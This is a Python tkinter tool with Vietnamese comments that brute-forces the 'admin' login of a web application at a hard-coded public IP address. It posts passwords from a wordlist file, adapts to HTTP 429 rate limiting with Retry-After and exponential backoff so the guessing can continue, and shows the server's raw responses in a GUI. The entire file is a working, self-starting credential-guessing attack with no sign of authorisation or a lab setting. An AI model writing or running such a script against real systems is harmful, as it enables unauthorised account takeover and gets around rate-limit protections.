import tkinter as tk
from tkinter import scrolledtext
import requests, threading, time, os

# -------- CONFIG --------
URL = "http://13.211.197.192:5000/Account/Login"
USERNAME = "admin"
# Make PASSFILE relative to script directory so it's found reliably
PASSFILE = os.path.join(os.path.dirname(__file__), "pass.txt") if "__file__" in globals() else "pass.txt"

BASE_DELAY = 0.5       # delay mặc định (giữ nhỏ)
MAX_DELAY = 30         # delay tối đa giới hạn
BACKOFF_FACTOR = 2.0   # nhân lên khi gặp 429
MAX_RETRIES = 4        # số lần retry khi gặp 429 cho cùng 1 password
# ------------------------

responses = {}
# trạng thái delay hiện tại (cập nhật khi thấy 429)
current_delay = BASE_DELAY
# khóa để tránh race condition khi cập nhật current_delay
delay_lock = threading.Lock()

# helper to safely append to the log from background threads
def safe_log(msg):
    if 'root' in globals():
        root.after(0, lambda: (log.insert(tk.END, msg), log.see(tk.END)))
    else:
        # fallback if root not yet created
        print(msg)

def send_one_password_with_backoff(pwd):
    """
    Gửi password, nếu nhận 429 thì retry (dựa trên Retry-After nếu có)
    và tăng current_delay (exponential backoff).
    Trả về raw response string (nếu có) hoặc lỗi.
    """
    global current_delay

    form = {
        "returnUrl": "",
        "addToCartProductId": "",
        "addToCartQuantity": "",
        "saveVoucherId": "",
        "sellerId": "",
        "Username": USERNAME,
        "Password": pwd
    }

    attempt = 0
    while attempt <= MAX_RETRIES:
        attempt += 1
        try:
            r = requests.post(URL, data=form, allow_redirects=False, timeout=15)
        except Exception as e:
            return f"ERROR sending request: {repr(e)}"

        # nếu 429: xử lý backoff + retry
        if r.status_code == 429:
            # lấy Retry-After nếu có, ưu tiên dùng header
            ra = r.headers.get("Retry-After")
            if ra:
                try:
                    wait = int(ra)
                except Exception:
                    # nếu không parse được (HTTP date), fallback dùng current_delay
                    wait = int(current_delay)
            else:
                wait = int(current_delay)

            # tăng current_delay (exponential) để các request tiếp theo cũng chậm hơn
            with delay_lock:
                current_delay = min(MAX_DELAY, max(current_delay * BACKOFF_FACTOR, current_delay + 1))

            # nếu đã retry vượt max -> trả về response (vẫn lưu headers/body)
            if attempt > MAX_RETRIES:
                return build_raw_response(r)

            # chờ theo Retry-After hoặc current_delay, rồi retry
            time.sleep(wait)
            continue

        # không phải 429 -> reset current_delay về base
        with delay_lock:
            current_delay = BASE_DELAY

        # trả về response raw (status line + headers + body)
        return build_raw_response(r)

    # nếu thoát vòng mà không trả về (không nên xảy ra)
    return "No response recorded."

def build_raw_response(r):
    try:
        # status line
        status_line = f"HTTP/1.1 {r.status_code} {r.reason}"
        headers_lines = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body = r.text or ""
        return f"{status_line}\n{headers_lines}\n\n{body}"
    except Exception as e:
        return f"ERROR building response: {e}"

# ========== GUI và luồng chính ==========
def attack_thread():
    if not os.path.exists(PASSFILE):
        safe_log(f"Không tìm thấy file {PASSFILE}\n")
        return

    with open(PASSFILE, "r", encoding="utf-8") as f:
        pw_lines = [line.strip() for line in f if line.strip()]

    # clear listbox và show placeholders
    def _init_list():
        listbox.delete(0, tk.END)
        for p in pw_lines:
            listbox.insert(tk.END, f"[WAIT] {p}")
            listbox.itemconfig(tk.END, fg='gray')
    root.after(0, _init_list)

    for idx, pwd in enumerate(pw_lines):
        # update UI show sending
        def _mark_sending(i, p):
            listbox.delete(i)
            listbox.insert(i, f"[SENDING] {p}")
            listbox.itemconfig(i, fg='orange')
        root.after(0, _mark_sending, idx, pwd)

        raw = send_one_password_with_backoff(pwd)
        responses[pwd] = raw

        # update UI show done
        def _mark_done(i, p):
            listbox.delete(i)
            listbox.insert(i, f"[DONE] {p}")
            listbox.itemconfig(i, fg='black')
        root.after(0, _mark_done, idx, pwd)

        # log và chờ theo current_delay (lấy bản sao an toàn)
        with delay_lock:
            wait = current_delay
        safe_log(f"Sent {pwd}. Waiting {wait}s before next.\n")
        time.sleep(wait)

    safe_log("✅ Đã gửi xong toàn bộ.\n")

def on_select(event):
    sel = listbox.curselection()
    if not sel:
        return
    idx = sel[0]
    label = listbox.get(idx)
    # format "[...] password"
    try:
        pwd = label.split("] ", 1)[1]
    except Exception:
        pwd = label
    resp = responses.get(pwd)
    response_text.delete(1.0, tk.END)
    if resp:
        response_text.insert(tk.END, resp)
    else:
        response_text.insert(tk.END, "Chưa có phản hồi cho mật khẩu này.")

# GUI setup
root = tk.Tk()
root.title("Password Sender (Backoff on 429)")
root.geometry("1000x650")

left_frame = tk.Frame(root)
left_frame.pack(side="left", fill="y", padx=10, pady=10)

tk.Label(left_frame, text="Passwords").pack()
listbox = tk.Listbox(left_frame, width=45, height=30)
listbox.pack(side="left", fill="y")
scrollbar = tk.Scrollbar(left_frame)
scrollbar.pack(side="right", fill="y")
listbox.config(yscrollcommand=scrollbar.set)
scrollbar.config(command=listbox.yview)
listbox.bind("<<ListboxSelect>>", on_select)

right_frame = tk.Frame(root)
right_frame.pack(side="right", fill="both", expand=True, padx=10, pady=10)

tk.Label(right_frame, text="Server Response").pack()
response_text = scrolledtext.ScrolledText(right_frame, wrap="word")
response_text.pack(fill="both", expand=True)

bottom_frame = tk.Frame(root)
bottom_frame.pack(side="bottom", fill="x", pady=6)

status_label = tk.Label(bottom_frame, text="Ready.")
status_label.pack(side="left", padx=10)

log = scrolledtext.ScrolledText(root, height=6)
log.pack(side="bottom", fill="x", padx=10, pady=6)

# Start sending automatically when program runs (start after mainloop begins)
root.after(100, lambda: threading.Thread(target=attack_thread, daemon=True).start())

root.mainloop()
